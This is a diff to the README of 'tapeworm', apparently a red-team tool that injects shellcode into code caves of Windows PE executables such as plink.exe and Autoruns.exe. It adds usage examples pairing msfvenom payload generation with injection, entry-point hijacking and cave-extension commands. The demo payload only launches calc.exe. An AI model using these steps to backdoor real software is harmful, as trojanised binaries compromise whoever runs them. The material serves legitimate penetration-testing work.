@@ -39,26 +39,42 @@ options:
                         but it will make the main program break at some unexpected point.
 ```
 
-Example:
+### Examples
 
 ```bash
+# generate some shellcode
 msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -o payload.bin
-python tapeworm.py \
+# inject it into plink.exe
+./tapeworm.py \
   -p payload.bin \
   -i plink.exe \
   -o injected_plink.exe \
   --use-create-thread
 ```
 
-Sometimes injecting the `jmp <your-shellcode>` instruction at PE's entry point will crash the app if, for example, one of the replaced instructions contains a relocation (tapeworm won't edit them). In that case, run your favorite debugger, find some safe address to inject `jmp` to and pass it via `--injection-address`:
+Sometimes injecting the `jmp <your-shellcode>` instruction at PE's entry point will crash the app if, for example, one of the replaced instructions contains a relocation (tapeworm won't edit them). In that case, run your favorite debugger, find some safe address to inject `jmp` to and pass its RVA via `--injection-address`:
 
 ```bash
-python tapeworm.py \
+./tapeworm.py \
   -p payload.bin \
-  -i plink.exe \
-  -o injected_plink.exe \
-  --injection-address 4d00
+  -i Autoruns.exe \
+  -o injected_Autoruns.exe \
+  --injection-address 'd34db'
 ```
+
+If the code cave is too small for your shellcode, you may try to extend it by passing the amount of additional bytes with `-e/--extend-cave`. This will overwrite some instructions at the end of the `.text` section and will probably make the original program crash at some point. Example:
+
+```bash
+./tapeworm.py \
+  -p calc64.bin \
+  -i Autoruns64.exe \
+  -o injected_Autoruns64.exe \
+  --use-create-thread \
+  --injection-address 105014 \
+  -e 45
+```
+
+If you run tapeworm without `-e` it will prompt you about the minimal value needed to extend the cave.
 
 ## What does it do?
 
@@ -66,7 +82,7 @@ It tries to inject your shellcode into the code cave at the end of the `.text` s
 
 Then it alters a few first instructions of your PE's entry point (or the instructions at the address passed via the `--injection-address` switch) to jump to the shellcode.
 
-After the shellcode is executed, registers and flags are restored, and execution is resumed.
+After the shellcode is executed, registers and flags are restored and execution is resumed.
 
 If you pass `--use-create-thread`, your shellcode will be ran in a new thread. Tapeworm will inject additional shellcode that runs `CreateThread`.
 
